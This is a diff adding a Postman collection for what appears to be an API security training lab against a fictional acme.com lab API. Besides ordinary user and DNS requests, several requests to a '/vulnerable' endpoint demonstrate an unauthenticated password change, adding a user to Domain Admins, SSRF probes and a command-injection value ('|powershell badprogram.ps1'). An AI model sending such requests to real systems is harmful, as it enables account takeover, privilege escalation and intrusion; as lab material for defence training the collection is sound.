@@ -1,0 +1,604 @@
+{
+	"info": {
+		"_postman_id": "ea993865-2f33-4b22-9406-a220d1b79a97",
+		"name": "student-class3-module4-lab01",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Request 1: Retrieve User Attributes without JWT",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/user?username=user1",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"user"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "user1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 2: Retrieve User Attributes with JWT",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "tokenType",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/user?username=user1",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"user"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "user1"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 3: Update a Valid User Attribute",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "tokenType",
+							"value": "Bearer",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "PATCH",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"rtype\": \"attribute\",\r\n  \"username\": \"user1\",\r\n  \"employeeNumber\": \"123456\"\r\n\r\n}"
+				},
+				"url": {
+					"raw": "https://api.acme.com/user",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"user"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 4: Update a Nonexistent User's Attribute",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "tokenType",
+							"value": "Bearer",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "PATCH",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"rtype\": \"attribute\",\r\n  \"username\": \"POST_API\",\r\n  \"employeeNumber\": \"123456789\"\r\n\r\n}"
+				},
+				"url": {
+					"raw": "https://api.acme.com/user",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"user"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 5: Update a Valid User Attribute with PUT",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "tokenType",
+							"value": "Bearer",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "PUT",
+				"header": [
+					{
+						"key": "Content-Type",
+						"type": "text",
+						"value": "application/json"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n  \"rtype\": \"attribute\",\r\n  \"username\": \"user1\",\r\n  \"employeeNumber\": \"123456\"\r\n\r\n}"
+				},
+				"url": {
+					"raw": "https://api.acme.com/user",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"user"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 6: Create User",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "tokenType",
+							"value": "Bearer",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\"Username\": \"smith\",\r\n\"employeeNumber\": \"100\",\r\n\"Givenname\": \"Bob\",\r\n\"Surname\": \"Smith\",\r\n\"UserPrincipalName\": \"smith@f5lab.local\",\r\n\"OU\": \"IT\",\r\n\"Password\": \"F@k3P@assw0rd\",\r\n\"email\": \"b.smith@acme.com\"\r\n}"
+				},
+				"url": {
+					"raw": "https://api.acme.com/user",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"user"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 7: Request Invalid Endpoint",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "tokenType",
+							"value": "Bearer",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/hacker/attack/u.txt",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"hacker",
+						"attack",
+						"u.txt"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request8: Create DNS Entry",
+			"request": {
+				"auth": {
+					"type": "oauth2",
+					"oauth2": [
+						{
+							"key": "accessToken",
+							"value": "",
+							"type": "string"
+						},
+						{
+							"key": "tokenType",
+							"value": "Bearer",
+							"type": "string"
+						},
+						{
+							"key": "addTokenTo",
+							"value": "header",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n \"record_type\":\"a\",\r\n \"fqdn\":\"app.acme.com\",\r\n \"computer_ip\":\"10.1.10.35\"\r\n}"
+				},
+				"url": {
+					"raw": "https://api.acme.com/dns",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"dns"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request9: Retrieve Phone and Mail Attributes",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request10: Change Password",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&password=letmein",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "password",
+							"value": "letmein"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request11: Update Groups",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&memberof=Domain Admins",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "memberof",
+							"value": "Domain Admins"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 12: Retrieve CN",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&cn=",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "cn",
+							"value": ""
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 13: SSRF Attack - Dummy",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&uri=http://dummy.restapiexample.com/api/v1/employees",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "uri",
+							"value": "http://dummy.restapiexample.com/api/v1/employees"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 14: SSRF Attack - unprotected-json",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?useridentity=hackeduser&uri=http://unprotected-json.f5lab.local/",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "useridentity",
+							"value": "hackeduser"
+						},
+						{
+							"key": "uri",
+							"value": "http://unprotected-json.f5lab.local/"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Request 15: Inject PowerShell",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "https://api.acme.com/vulnerable?inject=|powershell badprogram.ps1",
+					"protocol": "https",
+					"host": [
+						"api",
+						"acme",
+						"com"
+					],
+					"path": [
+						"vulnerable"
+					],
+					"query": [
+						{
+							"key": "inject",
+							"value": "|powershell badprogram.ps1"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"variable": [
+		{
+			"key": "PRIOR_RESPONSE",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "APP_NAME",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "PARTITION_NAME",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "PATH_NAME",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "DNS_RESOLVER_NAME",
+			"value": "",
+			"type": "string"
+		},
+		{
+			"key": "CLIENT_SSL_NAME",
+			"value": "",
+			"type": "string"
+		}
+	]
+}
